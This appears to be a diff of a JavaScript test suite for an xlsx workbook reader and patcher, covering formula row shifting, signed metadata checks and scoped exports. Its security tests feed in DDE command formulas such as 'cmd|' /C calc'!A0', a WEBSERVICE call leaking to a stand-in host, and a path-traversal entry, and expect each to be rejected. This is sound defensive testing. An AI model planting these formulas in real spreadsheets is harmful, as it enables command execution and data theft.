@@ -495,7 +495,7 @@ test('row insertion shifts formula tokens, sheet ranges, and shared or array ref
   const sourceWorksheet = strFromU8(syntheticTemplateFiles()['xl/worksheets/sheet1.xml'])
     .replace(
       '<c r="B4" s="7"><f>SUM(B2:B3)</f><v>300</v></c>',
-      '<c r="B4" s="7"><f>LOG10(A10)+_A10+A10+SUM(B2:B10)+&quot;A10&quot;</f><v>300</v></c>'
+      '<c r="B4" s="7"><f>LOG10(A10)+_A10+A10+SUM(B2:B10)+SUM(Table1[A10])+SUM(Table1[[#Headers],[B10]])+&quot;A10&quot;</f><v>300</v></c>'
         + '<c r="C4" s="7"><f t="shared" ref="C3:C10" si="0">SUM(&apos;Arkusz A&apos;!A3:A10)</f><v>9</v></c>'
         + '<c r="D4" s="7"><f t="array" ref="D2:D10">SUM(A2:A10)</f><v>9</v></c>',
     )
@@ -513,7 +513,7 @@ test('row insertion shifts formula tokens, sheet ranges, and shared or array ref
   const worksheet = strFromU8(files['xl/worksheets/sheet1.xml'])
   const otherWorksheet = strFromU8(files['xl/worksheets/sheet2.xml'])
 
-  assert.match(worksheet, /<c r="B5" s="7"><f>LOG10\(A11\)\+_A10\+A11\+SUM\(B2:B11\)\+&quot;A10&quot;<\/f><\/c>/)
+  assert.match(worksheet, /<c r="B5" s="7"><f>LOG10\(A11\)\+_A10\+A11\+SUM\(B2:B11\)\+SUM\(Table1\[A10\]\)\+SUM\(Table1\[\[#Headers\],\[B10\]\]\)\+&quot;A10&quot;<\/f><\/c>/)
   assert.match(worksheet, /<c r="C5" s="7"><f t="shared" ref="C4:C11" si="0">SUM\(&apos;Arkusz A&apos;!A4:A11\)<\/f><\/c>/)
   assert.match(worksheet, /<c r="D5" s="7"><f t="array" ref="D2:D11">SUM\(A2:A11\)<\/f><\/c>/)
   assert.match(otherWorksheet, /SUM\(&apos;Arkusz A&apos;!B2:B4\)/)
@@ -656,6 +656,81 @@ test('signed inline Meta cannot be downgraded by removing shared strings and ren
     },
   }), /PANEL_META_REQUIRED/)
   assert.equal(verificationCalls, 1)
+})
+
+test('malformed renamed inline Meta cannot be downgraded after shared-string compaction', async () => {
+  const { readPanelWorkbook } = await workbookOoxml()
+  const files = unzipSync(await patchedPanelWorkbook())
+  const strings = sharedValuesFrom(strFromU8(files['xl/sharedStrings.xml']))
+  for (const path of Object.keys(files).filter((path) => /^xl\/worksheets\/sheet\d+\.xml$/.test(path))) {
+    files[path] = strToU8(resaveSharedCellsAsInline(strFromU8(files[path]), strings))
+  }
+  delete files['xl/sharedStrings.xml']
+  files['xl/_rels/workbook.xml.rels'] = strToU8(
+    strFromU8(files['xl/_rels/workbook.xml.rels']).replace(
+      /<Relationship\b(?=[^>]*\/sharedStrings)[^>]*\/>/,
+      '',
+    ),
+  )
+  files['[Content_Types].xml'] = strToU8(
+    strFromU8(files['[Content_Types].xml']).replace(
+      /<Override\b(?=[^>]*\/xl\/sharedStrings\.xml)[^>]*\/>/,
+      '',
+    ),
+  )
+  files['xl/workbook.xml'] = strToU8(
+    strFromU8(files['xl/workbook.xml']).replaceAll('Panel — ', 'Archive — '),
+  )
+  const invalidCellFiles = Object.fromEntries(Object.entries(files)
+    .map(([path, bytes]) => [path, new Uint8Array(bytes)]))
+  files['xl/worksheets/sheet9.xml'] = strToU8(
+    strFromU8(files['xl/worksheets/sheet9.xml'])
+      .replace(
+        '</sheetData>',
+        '<row r="3"><c r="A3" t="inlineStr"><is><t>duplicate</t></is></c></row></sheetData>',
+      ),
+  )
+  invalidCellFiles['xl/worksheets/sheet9.xml'] = strToU8(
+    strFromU8(invalidCellFiles['xl/worksheets/sheet9.xml']).replace(
+      /<c\b(?=[^>]*\br="A2")[^>]*>[\s\S]*?<\/c>/,
+      '<c r="A2" t="s"><v>999999</v></c>',
+    ),
+  )
+  let verificationCalls = 0
+
+  await assert.rejects(readPanelWorkbook(zipSync(files), {
+    verify: async (...args) => {
+      verificationCalls++
+      return signingCallbacks.verify(...args)
+    },
+  }), /WORKBOOK_ROW_INVALID|PANEL_META_INVALID/)
+  await assert.rejects(readPanelWorkbook(zipSync(invalidCellFiles), {
+    verify: async (...args) => {
+      verificationCalls++
+      return signingCallbacks.verify(...args)
+    },
+  }), /WORKBOOK_SHARED_STRING_INVALID|PANEL_META_INVALID/)
+  assert.equal(verificationCalls, 0)
+})
+
+test('ordinary legacy text equal to the marker is not a Meta envelope', async () => {
+  const { readPanelWorkbook } = await workbookOoxml()
+  const files = syntheticTemplateFiles()
+  files['xl/worksheets/sheet2.xml'] = strToU8(
+    strFromU8(files['xl/worksheets/sheet2.xml']).replace(
+      '<c r="A1" s="7"><v>42</v></c>',
+      '<c r="A1" t="inlineStr"><is><t>Panel-v2</t></is></c>',
+    ),
+  )
+
+  assert.deepEqual(await readPanelWorkbook(zipSync(files), {
+    verify: () => { throw new Error('legacy text must not invoke verification') },
+  }), {
+    edits: [],
+    kind: 'legacy',
+    metadata: null,
+    voidIds: [],
+  })
 })
 
 test('missing worksheet rows never imply void while signed explicit void IDs survive', async () => {
@@ -822,6 +897,115 @@ test('scoped output takes labels and fields only from the explicit authorized sh
   }, { sign: signingCallbacks.sign }), /PANEL_SCOPED_SHEETS_INVALID/)
 })
 
+test('scoped Meta filters each row by its containing allowed sheet schema', async () => {
+  const { createScopedPanelWorkbook, readPanelWorkbook } = await workbookOoxml()
+  const crossPolicySentinel = 'CROSS_POLICY_DIGEST_SENTINEL'
+  const metadata = panelMeta({
+    rows: [{
+      id: 'visit_allowed',
+      type: 'appointment',
+      baseVersion: 1,
+      fieldDigests: {
+        clientName: `digest_${crossPolicySentinel}`,
+        visitNote: 'digest_visit_note_1234',
+      },
+    }, {
+      id: 'client_allowed',
+      type: 'client',
+      baseVersion: 2,
+      fieldDigests: { clientName: 'digest_client_name_123' },
+    }],
+  })
+  const allowedSheets = [{
+    name: 'Panel — Wizyty',
+    columns: [{ key: 'visitNote', label: 'Notatka', type: 'text' }],
+  }, {
+    name: 'Panel — Klienci',
+    columns: [{ key: 'clientName', label: 'Klient', type: 'text' }],
+  }]
+  const sheets = [{
+    name: 'Panel — Wizyty',
+    columns: [
+      { key: 'visitNote', label: 'Notatka źródłowa', type: 'text' },
+      { key: 'clientName', label: 'Pole obce', type: 'text' },
+    ],
+    rows: [{
+      id: 'visit_allowed',
+      values: { clientName: 'Nie eksportuj', visitNote: 'Bezpieczna' },
+    }],
+  }, {
+    name: 'Panel — Klienci',
+    columns: [{ key: 'clientName', label: 'Klient źródłowy', type: 'text' }],
+    rows: [{ id: 'client_allowed', values: { clientName: 'Dozwolony' } }],
+  }]
+  const scoped = await createScopedPanelWorkbook({
+    allowedRowIds: ['client_allowed', 'visit_allowed'],
+    allowedSheets,
+    metadata,
+    sheets,
+  }, { sign: signingCallbacks.sign })
+  const allPartText = Object.values(unzipSync(scoped)).map((bytes) => strFromU8(bytes)).join('\n')
+
+  assert.doesNotMatch(allPartText, new RegExp(crossPolicySentinel))
+  const read = await readPanelWorkbook(scoped, { verify: signingCallbacks.verify })
+  assert.deepEqual(read.metadata.rows, [{
+    baseVersion: 2,
+    fieldDigests: { clientName: 'digest_client_name_123' },
+    id: 'client_allowed',
+    type: 'client',
+  }, {
+    baseVersion: 1,
+    fieldDigests: { visitNote: 'digest_visit_note_1234' },
+    id: 'visit_allowed',
+    type: 'appointment',
+  }])
+  assert.deepEqual(read.edits, [{
+    id: 'client_allowed',
+    sheet: 'Panel — Klienci',
+    values: { clientName: 'Dozwolony' },
+  }, {
+    id: 'visit_allowed',
+    sheet: 'Panel — Wizyty',
+    values: { visitNote: 'Bezpieczna' },
+  }])
+})
+
+test('scoped output rejects a row contained by more than one allowed sheet', async () => {
+  const { createScopedPanelWorkbook } = await workbookOoxml()
+  const metadata = panelMeta({
+    rows: [{
+      id: 'shared_row',
+      type: 'appointment',
+      baseVersion: 1,
+      fieldDigests: {
+        clientName: 'digest_client_name_123',
+        visitNote: 'digest_visit_note_1234',
+      },
+    }],
+  })
+
+  await assert.rejects(createScopedPanelWorkbook({
+    allowedRowIds: ['shared_row'],
+    allowedSheets: [{
+      name: 'Panel — Wizyty',
+      columns: [{ key: 'visitNote', label: 'Notatka', type: 'text' }],
+    }, {
+      name: 'Panel — Klienci',
+      columns: [{ key: 'clientName', label: 'Klient', type: 'text' }],
+    }],
+    metadata,
+    sheets: [{
+      name: 'Panel — Wizyty',
+      columns: [{ key: 'visitNote', label: 'Notatka', type: 'text' }],
+      rows: [{ id: 'shared_row', values: { visitNote: 'Pierwszy' } }],
+    }, {
+      name: 'Panel — Klienci',
+      columns: [{ key: 'clientName', label: 'Klient', type: 'text' }],
+      rows: [{ id: 'shared_row', values: { clientName: 'Drugi' } }],
+    }],
+  }, { sign: signingCallbacks.sign }), /PANEL_SCOPED_ROW_SHEET_AMBIGUOUS/)
+})
+
 const withWorkbookRelationship = (relationship) => {
   const files = syntheticTemplateFiles()
   files['xl/_rels/workbook.xml.rels'] = strToU8(
@@ -849,7 +1033,7 @@ const duplicateArchivePath = (bytes, from, to) => {
 }
 
 test('all OOXML entry points reject the ZIP and active-content security corpus', async () => {
-  const { patchPanelWorkbook } = await workbookOoxml()
+  const { patchPanelWorkbook, readPanelWorkbook } = await workbookOoxml()
   const duplicateSource = zipSync({
     ...syntheticTemplateFiles(),
     'dup/a.txt': strToU8('one'),
@@ -897,6 +1081,24 @@ test('all OOXML entry points reject the ZIP and active-content security corpus',
     }),
     code: 'WORKBOOK_FORMULA_FORBIDDEN',
   }, {
+    name: 'WINWORD pipe-style DDE formula',
+    bytes: syntheticTemplate({
+      'xl/worksheets/sheet1.xml': strToU8(
+        strFromU8(syntheticTemplateFiles()['xl/worksheets/sheet1.xml'])
+          .replace('SUM(B2:B3)', "WINWORD|'System'!A1"),
+      ),
+    }),
+    code: 'WORKBOOK_FORMULA_FORBIDDEN',
+  }, {
+    name: 'arbitrary-application pipe-style DDE formula',
+    bytes: syntheticTemplate({
+      'xl/worksheets/sheet1.xml': strToU8(
+        strFromU8(syntheticTemplateFiles()['xl/worksheets/sheet1.xml'])
+          .replace('SUM(B2:B3)', "ACMEAPP|'Topic'!Z9"),
+      ),
+    }),
+    code: 'WORKBOOK_FORMULA_FORBIDDEN',
+  }, {
     name: 'traversal path',
     bytes: syntheticTemplate({ '../escape.txt': strToU8('unsafe') }),
     code: 'WORKBOOK_ARCHIVE_PATH_INVALID',
@@ -915,10 +1117,13 @@ test('all OOXML entry points reject the ZIP and active-content security corpus',
   }]
 
   for (const { name, bytes, code } of cases) {
+    await assert.rejects(readPanelWorkbook(bytes, {
+      verify: signingCallbacks.verify,
+    }), new RegExp(code), `${name} at the reader boundary`)
     await assert.rejects(patchPanelWorkbook(bytes, {
       sheets: [],
       metadata: panelMeta(),
-    }, { sign: signingCallbacks.sign }), new RegExp(code), name)
+    }, { sign: signingCallbacks.sign }), new RegExp(code), `${name} at the patch boundary`)
   }
 })
 
@@ -930,6 +1135,8 @@ test('generated formulas are explicit trusted inputs and reject external or exec
     "'[external.xlsx]Sheet 1'!A1",
     'WEBSERVICE("https://example.test/leak")',
     "cmd|' /C calc'!A0",
+    "WINWORD|'System'!A1",
+    "ACMEAPP|'Topic'!Z9",
   ]) {
     const sheets = panelSheets()
     sheets[0].rows[0].values.total.formula = formula
@@ -941,6 +1148,16 @@ test('generated formulas are explicit trusted inputs and reject external or exec
 
   const safe = await patchedPanelWorkbook()
   assert.equal((await readPanelWorkbook(safe, {
+    verify: signingCallbacks.verify,
+  })).kind, 'panel-v2')
+
+  const literalPipeSheets = panelSheets()
+  literalPipeSheets[0].rows[0].values.total.formula = 'IF(A1="left|right",1,0)'
+  const literalPipe = await patchPanelWorkbook(syntheticTemplate(), {
+    sheets: literalPipeSheets,
+    metadata: panelMetadata(),
+  }, { sign: signingCallbacks.sign })
+  assert.equal((await readPanelWorkbook(literalPipe, {
     verify: signingCallbacks.verify,
   })).kind, 'panel-v2')
 })
